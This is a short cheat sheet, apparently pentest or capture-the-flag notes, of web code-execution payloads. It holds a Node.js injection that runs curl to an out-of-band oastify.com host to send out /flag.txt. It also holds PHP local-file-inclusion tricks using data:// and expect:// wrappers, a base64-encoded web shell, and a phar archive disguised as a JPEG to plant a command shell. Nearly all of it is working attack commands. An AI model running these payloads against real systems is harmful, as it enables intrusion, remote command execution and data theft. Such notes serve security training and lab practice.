##### #nodejs Code injection
```js
process.mainModule.require('child_process').execSync('curl http://v2ykv786rd6cm20eq2zgccth78dz1ppe.oastify.com/$(cat /flag.txt)')+
```
##### Via #LFI and #PHP wrappers
Encode PHP script in base64:
```bash
echo '<?php system($_REQUEST("cmd")) ?>' | base64
```

```shell
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

#### Data wrapper expect
Check config for
```
extension=expect
```

```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
##### Via phar upload
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

?>
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
